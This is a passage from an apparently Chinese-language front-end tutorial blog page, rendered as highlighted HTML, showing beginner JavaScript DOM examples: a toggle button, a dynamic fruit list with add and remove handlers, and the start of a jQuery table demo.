class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">() =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> checkbox = button.<span class=\"property\">firstChild</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tcheckbox.<span class=\"property\">checked</span> = !checkbox.<span class=\"property\">checked</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tbutton.<span class=\"property\">style</span>.<span class=\"property\">backgroundColor</span> = </span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t\tcheckbox.<span class=\"property\">checked</span>? <span class=\"string\">&#x27;green&#x27;</span> : <span class=\"string\">&#x27;red&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// textcontent 修改标签文字内容 / innerHTML 修改标签内容</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// image.src / image.title / image.style / checkbox.checked 修改标签属性</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// ES6的做法：</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// for (let i = 0; i &lt; allButtons.length; i += 1) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t// 闭包(closure) - 将一个块级作用域的变量生命周期延长至全局</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tallButtons[i].addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tlet checkbox = allButtons[i].firstChild</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tcheckbox.checked = !checkbox.checked</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tallButtons[i].style.backgroundColor = </span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t\tcheckbox.checked? &#x27;green&#x27; : &#x27;red&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t&#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// ES5的做法：</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// for (var i = 0; i &lt; allButtons.length; i += 1) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tallButtons[i].addEventListener(&#x27;click&#x27;, function(evt) &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t// 我们知道事件发生时要做什么但我们不知道事件什么时候发生</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t// 在这种情况下就需要放置一个回调函数（callback function）</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t// 绑定事件时传入的函数通常我们称之为回调函数(evt)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t// 当浏览器执行该回调函数时会传入一个代表事件的对象</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t// 通过事件对象的target属性就可以获取到事件源（谁引发了事件）(evt.target)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tvar checkbox = evt.target.firstChild</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tcheckbox.checked = !checkbox.checked</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tevt.target.style.backgroundColor = </span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t\tcheckbox.checked? &#x27;green&#x27; : &#x27;red&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t&#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"动态列表效果-html\"><a href=\"#动态列表效果-html\" class=\"headerlink\" title=\"动态列表效果.html\"></a>动态列表效果.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t* &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#container</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">20px</span> <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>&gt;<span class=\"selector-tag\">li</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">list-style</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">line-height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: cadetblue;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">margin</span>: <span class=\"number\">2px</span> <span class=\"number\">0</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>&gt;<span class=\"selector-tag\">li</span>&gt;<span class=\"selector-tag\">a</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">float</span>: right;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-decoration</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">position</span>: relative;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">right</span>: <span class=\"number\">5px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>~<span class=\"selector-tag\">input</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">outline</span>: none;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">18px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>~<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=text]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-bottom</span>: <span class=\"number\">1px</span> solid darkgray;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">200px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">50px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-id\">#fruits</span>~<span class=\"selector-tag\">input</span><span class=\"selector-attr\">[type=button]</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">80px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">30px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">background-color</span>: coral;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">color</span>: white;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">vertical-align</span>: bottom;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">cursor</span>: pointer;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">div</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;container&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;fruits&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"comment\">&lt;!-- 将a标签的href属性修改为javascript:void(0)可以阻止a标签默认的行为(如删除标签防止还原) --&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>苹果<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>香蕉<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>火龙果<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span>西瓜<span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">&quot;&quot;</span>&gt;</span>×<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;text&quot;</span> <span class=\"attr\">name</span>=<span class=\"string\">&quot;fruit&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">input</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;ok&quot;</span> <span class=\"attr\">type</span>=<span class=\"string\">&quot;button&quot;</span> <span class=\"attr\">value</span>=<span class=\"string\">&quot;确定&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t</span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;/<span class=\"name\">div</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"comment\">&lt;!-- &lt;script src=&quot;../js/动态列表效果.js&quot;&gt;&lt;/script&gt; --&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">script</span>&gt;</span><span class=\"language-javascript\"></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">function</span> <span class=\"title function_\">addListItem</span>(<span class=\"params\"></span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> name = input.<span class=\"property\">value</span>.<span class=\"title function_\">trim</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">if</span> (name) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 创建标签用document对象的createElement方法</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> li = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;li&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 可以通过textContent或innerHTML属性来修改标签的内容</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tli.<span class=\"property\">innerHTML</span> = name</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"keyword\">let</span> a = <span class=\"variable language_\">document</span>.<span class=\"title function_\">createElement</span>(<span class=\"string\">&#x27;a&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\ta.<span class=\"property\">innerHTML</span> = <span class=\"string\">&#x27;&amp;times;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\ta.<span class=\"property\">href</span> = <span class=\"string\">&#x27;&#x27;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\ta.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;click&#x27;</span>, removeListItem)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 通过父标签的appendChild方法可以将子标签加到父标签最后面</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tli.<span class=\"title function_\">appendChild</span>(a)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 通过父标签的insertBefore方法可以将子标签加到指定的位置</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tul.<span class=\"title function_\">insertBefore</span>(li, ul.<span class=\"property\">lastChild</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tinput.<span class=\"property\">value</span> = <span class=\"string\">&#x27;&#x27;</span> <span class=\"comment\">// 输入完成后输入框清空</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 标签的focus方法可以让标签获得焦点</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 标签的blur方法可以让标签失去焦点</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tinput.<span class=\"title function_\">focus</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">function</span> <span class=\"title function_\">removeListItem</span>(<span class=\"params\">evt</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// evt.stopPropagation()</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tevt.<span class=\"title function_\">preventDefault</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 通过元素获取父元素 - parentNode</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 通过元素获取子元素 - children / firstElementChild / lastElementChild</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 通过元素获取兄弟元素 - previousElementSibling / nextElementSibling</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> li = evt.<span class=\"property\">target</span>.<span class=\"property\">parentNode</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"comment\">// 通过父元素的removeChild方法可以删除指定的子元素</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tul.<span class=\"title function_\">removeChild</span>(li)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> ul = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelector</span>(<span class=\"string\">&#x27;#fruits&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> input = ul.<span class=\"property\">nextElementSibling</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tinput.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;keypress&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">let</span> code = evt.<span class=\"property\">keyCode</span> || evt.<span class=\"property\">which</span> <span class=\"comment\">// 火狐</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"keyword\">if</span> (code == <span class=\"number\">13</span>) &#123;  <span class=\"comment\">// 回车键keycode=13</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"title function_\">addListItem</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">const</span> ok = input.<span class=\"property\">nextElementSibling</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const ul = document.querySelector(&#x27;#fruits&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const input = document.querySelector(&#x27;#fruits+input&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// const ok = document.querySelector(&#x27;#ok&#x27;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\tok.<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t<span class=\"title function_\">addListItem</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">var</span> anchors = <span class=\"variable language_\">document</span>.<span class=\"title function_\">querySelectorAll</span>(<span class=\"string\">&#x27;#fruits&gt;li&gt;a&#x27;</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"keyword\">for</span> (<span class=\"keyword\">let</span> i = <span class=\"number\">0</span>; i &lt; anchors.<span class=\"property\">length</span>; i += <span class=\"number\">1</span>) &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\tanchors[i].<span class=\"title function_\">addEventListener</span>(<span class=\"string\">&#x27;click&#x27;</span>, <span class=\"function\">(<span class=\"params\">evt</span>) =&gt;</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 事件对象的preventDefault方法可以阻止事件的默认行为（如事件触发时页面自动刷新）</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\t<span class=\"comment\">// 同 &lt;a href=&quot;javascript:void(0)&quot;&gt;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tevt.<span class=\"title function_\">preventDefault</span>()</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t\tul.<span class=\"title function_\">removeChild</span>(anchors[i].<span class=\"property\">parentNode</span>)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t\t&#125;)</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// 通过数组的forEach循环为每个a标签绑定点击事件</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// anchors.forEach(delAnchor =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \tdelAnchor.addEventListener(&#x27;click&#x27;, () =&gt; &#123;</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\t// 通过父标签的removeChild方法可以删除子标签</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t\tul.removeChild(delAnchor.parentNode)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// \t&#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t\t<span class=\"comment\">// &#125;)</span></span></span><br><span class=\"line\"><span class=\"language-javascript\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">script</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">html</span>&gt;</span></span><br></pre></td></tr></table></figure>\n\n<h1 id=\"引入和使用jQuery-html\"><a href=\"#引入和使用jQuery-html\" class=\"headerlink\" title=\"引入和使用jQuery.html\"></a>引入和使用jQuery.html</h1><figure class=\"highlight html\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;!DOCTYPE <span class=\"keyword\">html</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">html</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">meta</span> <span class=\"attr\">charset</span>=<span class=\"string\">&quot;utf-8&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">title</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">title</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">style</span>&gt;</span><span class=\"language-css\"></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">table</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* border: 730px; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border-collapse</span>: collapse;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"comment\">/* margin: 0 auto; */</span></span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t<span class=\"selector-tag\">td</span>, <span class=\"selector-tag\">th</span> &#123;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">border</span>: <span class=\"number\">1px</span> solid black;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">width</span>: <span class=\"number\">100px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">height</span>: <span class=\"number\">40px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">text-align</span>: center;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t\t<span class=\"attribute\">font-size</span>: <span class=\"number\">20px</span>;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t\t&#125;</span></span><br><span class=\"line\"><span class=\"language-css\">\t\t</span><span class=\"tag\">&lt;/<span class=\"name\">style</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;/<span class=\"name\">head</span>&gt;</span></span><br><span class=\"line\">\t<span class=\"tag\">&lt;<span class=\"name\">body</span>&gt;</span></span><br><span class=\"line\">\t\t<span class=\"tag\">&lt;<span class=\"name\">table</span> <span class=\"attr\">id</span>=<span class=\"string\">&quot;data&quot;</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">caption</span>&gt;</span>数据统计表<span class=\"tag\">&lt;/<span class=\"name\">caption</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>姓名<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>年龄<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>性别<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>身高<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">th</span>&gt;</span>体重<span class=\"tag\">&lt;/<span class=\"name\">th</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;/<span class=\"name\">thead</span>&gt;</span></span><br><span class=\"line\">\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tbody</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">tr</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item1<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item2<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span class=\"line\">\t\t\t\t\t<span class=\"tag\">&lt;<span class=\"name\">td</span>&gt;</span>Item3<span class=\"tag\">&lt;/<span class=\"name\">td</span>&gt;</span></span><br><span 